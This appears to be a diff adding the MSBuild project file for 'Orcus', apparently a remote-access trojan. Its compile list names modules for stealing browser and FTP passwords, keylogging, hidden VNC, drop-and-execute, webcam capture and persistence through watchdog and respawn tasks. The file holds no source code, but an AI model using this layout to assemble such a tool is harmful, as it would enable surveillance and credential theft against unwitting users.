@@ -1,0 +1,555 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="14.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{3601A898-0FE1-4710-AC30-2E6C417F46BD}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>Orcus</RootNamespace>
+    <AssemblyName>Orcus</AssemblyName>
+    <TargetFrameworkVersion>v3.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+    <TargetFrameworkProfile />
+    <Framework Condition=" '$(Framework)' == '' ">NET35</Framework>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>TRACE;DEBUG</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(TargetFrameworkVersion)' == 'v3.5'">
+    <DefineConstants>$(DefineConstants);NET35</DefineConstants>
+    <OutputPath>bin\$(Configuration)</OutputPath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(TargetFrameworkVersion)' == 'v4.5'">
+    <DefineConstants>$(DefineConstants);NET45</DefineConstants>
+    <OutputPath>bin\$(Configuration)\NET45</OutputPath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(TargetFrameworkVersion)' == 'v4.0'">
+    <DefineConstants>$(DefineConstants);NET40</DefineConstants>
+    <OutputPath>bin\$(Configuration)\NET40</OutputPath>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>
+    </ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="AForge.Video">
+      <HintPath>..\References\AForge.Video.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="AForge.Video.DirectShow">
+      <HintPath>..\References\AForge.Video.DirectShow.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="CSCore, Version=1.2.1.2, Culture=neutral, PublicKeyToken=5a08f2b6f4415dea, processorArchitecture=MSIL">
+      <HintPath>..\packages\CSCore.1.2.1.2\lib\net35-client\CSCore.dll</HintPath>
+    </Reference>
+    <Reference Include="FluentCommandLineParser, Version=1.4.3.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\FluentCommandLineParser.1.4.3\lib\net35\FluentCommandLineParser.dll</HintPath>
+    </Reference>
+    <Reference Include="ICSharpCode.SharpZipLib, Version=0.86.0.518, Culture=neutral, PublicKeyToken=1b03e6acf1164f73, processorArchitecture=MSIL">
+      <HintPath>..\packages\SharpZipLib.0.86.0\lib\20\ICSharpCode.SharpZipLib.dll</HintPath>
+    </Reference>
+    <Reference Include="JetBrains.Annotations, Version=10.2.1.0, Culture=neutral, PublicKeyToken=1010a0d8d6380325, processorArchitecture=MSIL">
+      <HintPath>..\packages\TaskScheduler.2.5.22\lib\net35\JetBrains.Annotations.dll</HintPath>
+    </Reference>
+    <Reference Include="Lidgren.Network">
+      <HintPath>..\References\Lidgren.Network.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.Win32.TaskScheduler, Version=2.5.22.0, Culture=neutral, PublicKeyToken=0d013ddd5178a2ae, processorArchitecture=MSIL">
+      <HintPath>..\packages\TaskScheduler.2.5.22\lib\net35\Microsoft.Win32.TaskScheduler.dll</HintPath>
+    </Reference>
+    <Reference Include="SharpDX">
+      <HintPath>..\References\SharpDX.dll</HintPath>
+    </Reference>
+    <Reference Include="SharpDX.Direct3D11">
+      <HintPath>..\References\SharpDX.Direct3D11.dll</HintPath>
+    </Reference>
+    <Reference Include="SharpDX.Direct3D9">
+      <HintPath>..\References\SharpDX.Direct3D9.dll</HintPath>
+    </Reference>
+    <Reference Include="SharpDX.DXGI">
+      <HintPath>..\References\SharpDX.DXGI.dll</HintPath>
+    </Reference>
+    <Reference Include="starksoft.aspen, Version=1.0.1.0, Culture=neutral, PublicKeyToken=56b8923a24d03eb3, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\References\starksoft.aspen.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.DirectoryServices.AccountManagement" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.ServiceModel" />
+    <Reference Include="System.ServiceModel.Web" />
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.Speech" />
+    <Reference Include="System.Web.Extensions" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="TurboJpegWrapper">
+      <HintPath>..\References\TurboJpegWrapper.dll</HintPath>
+    </Reference>
+    <Reference Include="WindowsBase" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="CommandManagement\CommandComparer.cs" />
+    <Compile Include="CommandManagement\CommandSelector.cs" />
+    <Compile Include="CommandManagement\CommandSettings.cs" />
+    <Compile Include="CommandManagement\ConnectionInfo.cs" />
+    <Compile Include="CommandManagement\DatabaseConnection.cs" />
+    <Compile Include="Commands\ClientCommands\ClientCommandsCommand.cs" />
+    <Compile Include="Commands\ClientCommands\ClientCommandsFeedbackFactory.cs" />
+    <Compile Include="Commands\ClipboardManager\ClipboardManagerCommand.cs" />
+    <Compile Include="Commands\FileExplorer\ProcessingEntriesChangedEventArgs.cs" />
+    <Compile Include="Commands\FileExplorer\ZipUtilities.cs" />
+    <Compile Include="Commands\Passwords\Applications\Mozilla\MozillaDecryptor.cs" />
+    <Compile Include="Utilities\CancellationTokenEx.cs" />
+    <Compile Include="Utilities\ClipboardNotification.cs" />
+    <Compile Include="Commands\ConnectionInitializer\ConnectionInitializerCommand.cs" />
+    <Compile Include="Commands\ConnectionInitializer\TcpConnection.cs" />
+    <Compile Include="Commands\ConnectionInitializer\UdpHolePunchingConnection.cs" />
+    <Compile Include="Commands\DeviceManager\HardwareHelper.cs" />
+    <Compile Include="Commands\DropAndExecute\DropAndExecuteCommand.cs" />
+    <Compile Include="Commands\DropAndExecute\HiddenDesktopApplicationManager.cs" />
+    <Compile Include="Commands\DropAndExecute\IApplicationWarder.cs" />
+    <Compile Include="Commands\DropAndExecute\TransferedFileInfo.cs" />
+    <Compile Include="Commands\FileExplorer\WindowsThumbnailProvider.cs" />
+    <Compile Include="Commands\RemoteDesktop\Capture\DesktopDuplication\DesktopDuplicationException.cs" />
+    <Compile Include="Commands\RemoteDesktop\Capture\DesktopDuplication\DesktopDuplicationService.cs" />
+    <Compile Include="Commands\RemoteDesktop\Capture\DesktopDuplication\IntPtrExtensions.cs" />
+    <Compile Include="Commands\RemoteDesktop\Capture\DesktopDuplication\RawRectangleExtensions.cs" />
+    <Compile Include="Commands\RemoteDesktop\Capture\FrontBuffer\FrontBufferService.cs" />
+    <Compile Include="Commands\RemoteDesktop\Capture\GDI\GdiService.cs" />
+    <Compile Include="Commands\RemoteDesktop\Capture\GDI\NativeMethods.cs" />
+    <Compile Include="Commands\RemoteDesktop\Capture\IScreenCaptureService.cs" />
+    <Compile Include="Commands\ConnectionInitializer\UdpLanConnection.cs" />
+    <Compile Include="Commands\ConnectionInitializer\ServerConnection.cs" />
+    <Compile Include="Commands\RemoteDesktop\Compression\TurboJpgImageCompression.cs" />
+    <Compile Include="Commands\RemoteDesktop\RemoteActions.cs" />
+    <Compile Include="Commands\RemoteDesktop\RemoteDesktopCommand.cs" />
+    <Compile Include="Commands\RemoteDesktop\ScreenHelper.cs" />
+    <Compile Include="Commands\ReverseProxy\Args\ReverseProxyDataReceivedEventArgs.cs" />
+    <Compile Include="Commands\ReverseProxy\Args\ReverseProxyEventArgs.cs" />
+    <Compile Include="Commands\ReverseProxy\Args\ReverseProxyStatusUpdatedEventArgs.cs" />
+    <Compile Include="Commands\ReverseProxy\ReverseProxyClient.cs" />
+    <Compile Include="Commands\ReverseProxy\ReverseProxyCommand.cs" />
+    <Compile Include="Commands\VoiceChat\Utilities\CSCoreDataPlayer.cs" />
+    <Compile Include="Commands\VoiceChat\Utilities\CSCoreRecorder.cs" />
+    <Compile Include="Commands\VoiceChat\VoiceChatCommand.cs" />
+    <Compile Include="Commands\WindowsDrivers\WindowsDriversCommand.cs" />
+    <Compile Include="Config\SettingsData.cs" />
+    <Compile Include="Connection\Args\StaticCommandPluginReceivedEventArgs.cs" />
+    <Compile Include="ConsolePrefixWriter.cs" />
+    <Compile Include="Core\ClientOperator.cs" />
+    <Compile Include="Core\LibraryLoader.cs" />
+    <Compile Include="Native\SetupApi\DiFunction.cs" />
+    <Compile Include="Native\SetupApi\DiGetClassFlags.cs" />
+    <Compile Include="Native\NativeMethodsAdvapi32.cs" />
+    <Compile Include="Native\NativeMethodsGdi32.cs" />
+    <Compile Include="Native\NativeMethodsIphlpapi.cs" />
+    <Compile Include="Native\NativeMethodsKernel32.cs" />
+    <Compile Include="Native\NativeMethodsSetupApi.cs" />
+    <Compile Include="Native\NativeMethodsShell32.cs" />
+    <Compile Include="Native\User32\DEVMODE.cs" />
+    <Compile Include="Native\User32\Display\DisplayDeviceStateFlags.cs" />
+    <Compile Include="Native\User32\Display\DisplaySettingsFlags.cs" />
+    <Compile Include="Native\User32\Display\DISPLAY_DEVICE.cs" />
+    <Compile Include="Native\User32\Display\DISP_CHANGE.cs" />
+    <Compile Include="Native\User32\Display\DM.cs" />
+    <Compile Include="Native\User32\Display\LUID.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_2DREGION.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_DEVICE_INFO_HEADER.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_DEVICE_INFO_TYPE.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_MODE_INFO.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_MODE_INFO_TYPE.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_MODE_INFO_UNION.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_PATH_INFO.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_PATH_SOURCE_INFO.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_PATH_TARGET_INFO.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_PIXELFORMAT.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_RATIONAL.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_ROTATION.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_SCALING.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_SCANLINE_ORDERING.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_SOURCE_MODE.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_TARGET_DEVICE_NAME.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_TARGET_DEVICE_NAME_FLAGS.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_TARGET_MODE.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_VIDEO_OUTPUT_TECHNOLOGY.cs" />
+    <Compile Include="Native\User32\Display\DISPLAYCONFIG_VIDEO_SIGNAL_INFO.cs" />
+    <Compile Include="Native\User32\Display\POINTL.cs" />
+    <Compile Include="Native\User32\Display\QUERY_DEVICE_CONFIG_FLAGS.cs" />
+    <Compile Include="Native\User32\GUITHREADINFO.cs" />
+    <Compile Include="Native\User32\INPUT.cs" />
+    <Compile Include="Native\NativeMethodsUser32.cs" />
+    <Compile Include="Native\Shell32\HResult.cs" />
+    <Compile Include="Native\Shell32\IShellItem.cs" />
+    <Compile Include="Native\User32\MapVirtualKeyMapTypes.cs" />
+    <Compile Include="Native\SetupApi\PropertyChangeParameters.cs" />
+    <Compile Include="Native\SetupApi\Scopes.cs" />
+    <Compile Include="Native\Shell32\IShellItemImageFactory.cs" />
+    <Compile Include="Native\Shell32\NativeSize.cs" />
+    <Compile Include="Native\Shell32\RGBQUAD.cs" />
+    <Compile Include="Native\Shell32\SIGDN.cs" />
+    <Compile Include="Native\Shell32\ThumbnailOptions.cs" />
+    <Compile Include="Native\SetupApi\SPDRP.cs" />
+    <Compile Include="Native\SetupApi\SP_DEVINFO_DATA.cs" />
+    <Compile Include="Native\SetupApi\StateChangeAction.cs" />
+    <Compile Include="Native\User32\WINDOWINFO.cs" />
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="StaticCommandManagement\ActiveCommandInfo.cs" />
+    <Compile Include="StaticCommandManagement\ActiveCommandStopScheduler.cs" />
+    <Compile Include="StaticCommandManagement\DynamicCommandFeedbackFactory.cs" />
+    <Compile Include="StaticCommandManagement\DynamicCommandStore.cs" />
+    <Compile Include="StaticCommandManagement\ExecutionEvents\IdleExecutionEvent.cs" />
+    <Compile Include="StaticCommandManagement\LoadedStaticCommandPluginInfo.cs" />
+    <Compile Include="StaticCommandManagement\StaticCommandSelector.cs" />
+    <Compile Include="CommandManagement\ToolBase.cs" />
+    <Compile Include="Commands\ActiveConnections\ActiveConnectionsCommand.cs" />
+    <Compile Include="Commands\ActiveConnections\Connections.cs" />
+    <Compile Include="Commands\AudioVolumeControl\AudioVolumeControlCommand.cs" />
+    <Compile Include="Commands\Audio\AudioCommand.cs" />
+    <Compile Include="Commands\Code\CodeCommand.cs" />
+    <Compile Include="Commands\ComputerInformation\ComputerInformation.cs" />
+    <Compile Include="Commands\ComputerInformation\InformationCollector.cs" />
+    <Compile Include="Commands\Console\ConsoleCommand.cs" />
+    <Compile Include="Commands\DeviceManager\DeviceManagerCommand.cs" />
+    <Compile Include="Commands\EventLog\EventLogCommand.cs" />
+    <Compile Include="Commands\FileExplorer\DirectoryHelper.cs" />
+    <Compile Include="Commands\FileExplorer\FileExplorerCommand.cs" />
+    <Compile Include="Commands\FileExplorer\FileHelper.cs" />
+    <Compile Include="Commands\FileExplorer\UploadProcess.cs" />
+    <Compile Include="Commands\FileExplorer\UploadService.cs" />
+    <Compile Include="Commands\FunActions\BlockUserInput.cs" />
+    <Compile Include="Commands\FunActions\BluescreenTool.cs" />
+    <Compile Include="Commands\FunActions\Computer.cs" />
+    <Compile Include="Commands\FunActions\DesktopWallpaper.cs" />
+    <Compile Include="Commands\FunActions\FunActionsCommand.cs" />
+    <Compile Include="Commands\FunActions\ImageUtilities.cs" />
+    <Compile Include="Commands\FunActions\KeyboardLayout.cs" />
+    <Compile Include="Commands\FunActions\Monitor.cs" />
+    <Compile Include="Commands\FunActions\Mouse.cs" />
+    <Compile Include="Commands\FunActions\Taskbar.cs" />
+    <Compile Include="Commands\FunActions\WindowsModules.cs" />
+    <Compile Include="Commands\HiddenApplication\HiddenApplicationCommand.cs" />
+    <Compile Include="Utilities\Lazy.cs" />
+    <Compile Include="Utilities\WindowsDesktop\DesktopActions.cs" />
+    <Compile Include="Commands\HVNC\HvncCommand.cs" />
+    <Compile Include="Utilities\WindowsDesktop\Desktop.cs" />
+    <Compile Include="Commands\HVNC\HvncHelper.cs" />
+    <Compile Include="Commands\HVNC\RenderWindow.cs" />
+    <Compile Include="Utilities\WindowsDesktop\Window.cs" />
+    <Compile Include="Commands\LiveKeylogger\LiveKeyloggerCommand.cs" />
+    <Compile Include="Commands\LivePerformance\LivePerformance.cs" />
+    <Compile Include="Commands\LivePerformance\LivePerformanceCommand.cs" />
+    <Compile Include="Commands\LivePerformance\StaticPerformance.cs" />
+    <Compile Include="Commands\MessageBox\MessageBoxCommand.cs" />
+    <Compile Include="Commands\Passwords\Applications\Chrome\Chrome.cs" />
+    <Compile Include="Commands\Passwords\Applications\CoreFTP\CoreFtp.cs" />
+    <Compile Include="Commands\Passwords\Applications\FileZilla\FileZilla.cs" />
+    <Compile Include="Commands\Passwords\Applications\Mozilla\Firefox.cs" />
+    <Compile Include="Commands\Passwords\Applications\Mozilla\FirefoxLogins.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\CryptoApi.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\ExplorerUrlHistory.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\InternetExplorer.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\ADDURL_FLAG.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\IEnumSTATURL.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\IUrlHistoryStg.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\IUrlHistoryStg2.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\SHFILEINFO.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\SortFileTimeAscendingHelper.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\STATURL.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\STATURLFLAGS.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\STATURL_QUERYFLAGS.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\UrlHistoryClass.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\UUID.cs" />
+    <Compile Include="Commands\Passwords\Applications\InternetExplorer\Native\Win32api.cs" />
+    <Compile Include="Commands\Passwords\Applications\JDownloader\JDownloader.cs" />
+    <Compile Include="Commands\Passwords\Applications\Opera\Opera.cs" />
+    <Compile Include="Commands\Passwords\Applications\Pidgin\Pidgin.cs" />
+    <Compile Include="Commands\Passwords\Applications\Mozilla\BerkeleyDB.cs" />
+    <Compile Include="Commands\Passwords\Applications\Mozilla\Cryptography\Asn1Der.cs" />
+    <Compile Include="Commands\Passwords\Applications\Mozilla\Cryptography\MozillaPBE.cs" />
+    <Compile Include="Commands\Passwords\Applications\Mozilla\Cryptography\TripleDESHelper.cs" />
+    <Compile Include="Commands\Passwords\Applications\Mozilla\Cryptography\PasswordCheck.cs" />
+    <Compile Include="Commands\Passwords\Applications\Mozilla\Thunderbird.cs" />
+    <Compile Include="Commands\Passwords\Applications\Windows\Windows.cs" />
+    <Compile Include="Commands\Passwords\Applications\WinSCP\WinSCP.cs" />
+    <Compile Include="Commands\Passwords\Applications\Yandex\Yandex.cs" />
+    <Compile Include="Commands\Passwords\ICookieRecovery.cs" />
+    <Compile Include="Commands\Passwords\IPasswordRecovery.cs" />
+    <Compile Include="Commands\Passwords\PasswordsCommand.cs" />
+    <Compile Include="Commands\Passwords\Utilities\ChromiumBase.cs" />
+    <Compile Include="Commands\Passwords\Utilities\KeyDecoder.cs" />
+    <Compile Include="Commands\Passwords\Utilities\RegistryExtensions.cs" />
+    <Compile Include="Commands\Passwords\Utilities\RegistryKeyExtensions.cs" />
+    <Compile Include="Commands\Passwords\Utilities\RegistryKeyHelper.cs" />
+    <Compile Include="Commands\Passwords\Utilities\SQLiteHandler.cs" />
+    <Compile Include="Commands\Passwords\Utilities\TimeHelper.cs" />
+    <Compile Include="Commands\RegistryExplorer\RegistryCommand.cs" />
+    <Compile Include="Commands\StartupManager\AutostartManager.cs" />
+    <Compile Include="Commands\StartupManager\FolderAutostart.cs" />
+    <Compile Include="Commands\StartupManager\RegistryAutostart.cs" />
+    <Compile Include="Commands\StartupManager\StartupManagerCommand.cs" />
+    <Compile Include="Commands\SystemRestore\SystemRestoreCommand.cs" />
+    <Compile Include="Commands\SystemRestore\SystemRestoreUtilities.cs" />
+    <Compile Include="Commands\TaskManager\ProcessExtension.cs" />
+    <Compile Include="Commands\TaskManager\TaskManagerCommand.cs" />
+    <Compile Include="Commands\TextChat\TextChatForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Commands\TextChat\TextChatForm.Designer.cs">
+      <DependentUpon>TextChatForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Commands\TextChat\SendTextMessageEventArgs.cs" />
+    <Compile Include="Commands\TextChat\TextChatCommand.cs" />
+    <Compile Include="Commands\TextChat\Utilities\Computer.cs" />
+    <Compile Include="Commands\TextChat\Utilities\RichTextBoxExtensions.cs" />
+    <Compile Include="Commands\UninstallPrograms\UninstallProgramsCommand.cs" />
+    <Compile Include="Commands\UserInteraction\UserInteractionCommand.cs" />
+    <Compile Include="Commands\Webcam\WebcamCommand.cs" />
+    <Compile Include="Commands\WindowManager\WindowManager.cs" />
+    <Compile Include="Commands\WindowManager\WindowManagerCommand.cs" />
+    <Compile Include="Commands\WindowsCustomizer\Core\DesktopProperties.cs" />
+    <Compile Include="Commands\WindowsCustomizer\Core\General.cs" />
+    <Compile Include="Commands\WindowsCustomizer\Core\Windows10.cs" />
+    <Compile Include="Commands\WindowsCustomizer\RegistryUtilities.cs" />
+    <Compile Include="Commands\WindowsCustomizer\WindowsPropertyInfo.cs" />
+    <Compile Include="Commands\WindowsCustomizer\WindowsCustomizerCommand.cs" />
+    <Compile Include="Config\Consts.cs" />
+    <Compile Include="Config\Settings.cs" />
+    <Compile Include="Core\UninstallHelper.cs" />
+    <Compile Include="Connection\AdministrationConnection.cs" />
+    <Compile Include="Connection\Client.cs" />
+    <Compile Include="Connection\InformationCollector.cs" />
+    <Compile Include="Connection\PluginReceiver.cs" />
+    <Compile Include="Connection\Args\FileTransferEventArgs.cs" />
+    <Compile Include="Connection\ServerConnection.cs" />
+    <Compile Include="Extensions\EnvironmentExtensions.cs" />
+    <Compile Include="Extensions\ImageExtensions.cs" />
+    <Compile Include="Extensions\RegistryExtensions.cs" />
+    <Compile Include="Extensions\StringExtensions.cs" />
+    <Compile Include="InstallationPromptForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="InstallationPromptForm.Designer.cs">
+      <DependentUpon>InstallationPromptForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="MainForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MainForm.Designer.cs">
+      <DependentUpon>MainForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Native\AdvApi32\ALG_ID.cs" />
+    <Compile Include="Native\ShlwApi\AssocF.cs" />
+    <Compile Include="Native\ShlwApi\AssocStr.cs" />
+    <Compile Include="Native\User32\GetWindow_Cmd.cs" />
+    <Compile Include="Native\AdvApi32\HashParameters.cs" />
+    <Compile Include="Native\User32\HookType.cs" />
+    <Compile Include="Native\User32\ICONINFO.cs" />
+    <Compile Include="Native\AdvApi32\IEAutoComplteSecretHeader.cs" />
+    <Compile Include="Native\AdvApi32\IESecretInfoHeader.cs" />
+    <Compile Include="Native\User32\KeyboardHookStruct.cs" />
+    <Compile Include="Native\User32\LASTINPUTINFO.cs" />
+    <Compile Include="Native\Kernel32\MEMORYSTATUSEX.cs" />
+    <Compile Include="Native\IphlpApi\MIB_TCPROW_OWNER_PID.cs" />
+    <Compile Include="Native\IphlpApi\MIB_TCPTABLE_OWNER_PID.cs" />
+    <Compile Include="Native\IphlpApi\MIB_UDPROW_OWNER_PID.cs" />
+    <Compile Include="Native\IphlpApi\MIB_UDPTABLE_OWNER_PID.cs" />
+    <Compile Include="Native\NativeMethods.cs" />
+    <Compile Include="Native\User32\POINTAPI.cs" />
+    <Compile Include="Native\User32\POINTL.cs" />
+    <Compile Include="Native\Ntdll\ProcessBasicInformation.cs" />
+    <Compile Include="Native\Kernel32\PROCESS_INFORMATION.cs" />
+    <Compile Include="Native\User32\RECT.cs" />
+    <Compile Include="Native\AdvApi32\SecretEntry.cs" />
+    <Compile Include="Native\User32\SetWindowPosFlags.cs" />
+    <Compile Include="Native\Shell32\SHFILEINFO.cs" />
+    <Compile Include="Native\User32\ShowWindowCommands.cs" />
+    <Compile Include="Native\Kernel32\STARTUPINFO.cs" />
+    <Compile Include="Native\Kernel32\SystemInfo.cs" />
+    <Compile Include="Native\IphlpApi\TCP_TABLE_CLASS.cs" />
+    <Compile Include="Native\Gdi32\TernaryRasterOperations.cs" />
+    <Compile Include="Native\User32\CURSORINFO.cs" />
+    <Compile Include="Native\Kernel32\ThreadAccess.cs" />
+    <Compile Include="Native\AdvApi32\TOKEN_INFORMATION_CLASS.cs" />
+    <Compile Include="Native\AdvApi32\TOKEN_USER.cs" />
+    <Compile Include="Native\IphlpApi\UDP_TABLE_CLASS.cs" />
+    <Compile Include="Utilities\WindowHelper.cs" />
+    <Compile Include="Native\User32\WindowMessages.cs" />
+    <Compile Include="Native\AdvApi32\_SID_AND_ATTRIBUTES.cs" />
+    <Compile Include="Plugins\CommandLoadedEventArgs.cs" />
+    <Compile Include="Plugins\PluginLoader.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Protection\Autostarter.cs" />
+    <Compile Include="Protection\Installer.cs" />
+    <Compile Include="Protection\RespawnTask.cs" />
+    <Compile Include="OrcusApplicationContext.cs" />
+    <Compile Include="Protection\Watchdog.cs" />
+    <Compile Include="Service\ServiceConnection.cs" />
+    <Compile Include="Service\ServiceInstaller.cs" />
+    <Compile Include="StaticCommandManagement\StaticCommandScheduler.cs" />
+    <Compile Include="StaticCommandManagement\StopSchedulerSettings.cs" />
+    <Compile Include="StaticCommands\ChangeWallpaperCommandEx.cs" />
+    <Compile Include="StaticCommandManagement\ExecutionEvents\DateTimeExecutionEvent.cs" />
+    <Compile Include="StaticCommands\RequestKeyLogCommandEx.cs" />
+    <Compile Include="StaticCommands\PasswordRecoveryCommandEx.cs" />
+    <Compile Include="StaticCommands\SystemLockCommandEx.cs" />
+    <Compile Include="StaticCommands\SystemLock\SystemLockForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="StaticCommands\SystemLock\SystemLockForm.Designer.cs">
+      <DependentUpon>SystemLockForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="StaticCommands\UninstallCommandEx.cs" />
+    <Compile Include="StaticCommands\UpdateCommandEx.cs" />
+    <Compile Include="StaticCommands\UpdateFromUrlCommandEx.cs" />
+    <Compile Include="Utilities\AuthenticodeTools.cs" />
+    <Compile Include="Utilities\CoreHelper.cs" />
+    <Compile Include="Utilities\CsvWriter.cs" />
+    <Compile Include="Utilities\Display.cs" />
+    <Compile Include="Utilities\ErrorReporter.cs" />
+    <Compile Include="Utilities\ExceptionUtilities.cs" />
+    <Compile Include="Utilities\FileUtilities.cs" />
+    <Compile Include="Utilities\KeyLogger\ActiveWindowChangedEventArgs.cs" />
+    <Compile Include="Utilities\KeyLogger\ActiveWindowHook.cs" />
+    <Compile Include="Utilities\KeyLogger\KeyboardHook.cs" />
+    <Compile Include="Utilities\KeyLogger\KeyLoggerService.cs" />
+    <Compile Include="Utilities\KeyLogger\KeyProcessing.cs" />
+    <Compile Include="Utilities\KeyLogger\SendLogEventArgs.cs" />
+    <Compile Include="Utilities\KeyLogger\StringDownEventArgs.cs" />
+    <Compile Include="Utilities\ManagementExtensions.cs" />
+    <Compile Include="Utilities\NotepadHelper.cs" />
+    <Compile Include="Utilities\ParentProcessUtilities.cs" />
+    <Compile Include="Utilities\ProcessExtensions.cs" />
+    <Compile Include="Utilities\ProxyHelper.cs" />
+    <Compile Include="Utilities\ResourceHelper.cs" />
+    <Compile Include="Utilities\ScreenExtensions.cs" />
+    <Compile Include="Utilities\ScreenHelper.cs" />
+    <Compile Include="Utilities\TimeoutEx.cs" />
+    <Compile Include="Utilities\User.cs" />
+    <EmbeddedResource Include="Commands\TextChat\TextChatForm.resx">
+      <DependentUpon>TextChatForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="InstallationPromptForm.resx">
+      <DependentUpon>InstallationPromptForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="MainForm.resx">
+      <DependentUpon>MainForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <SubType>Designer</SubType>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
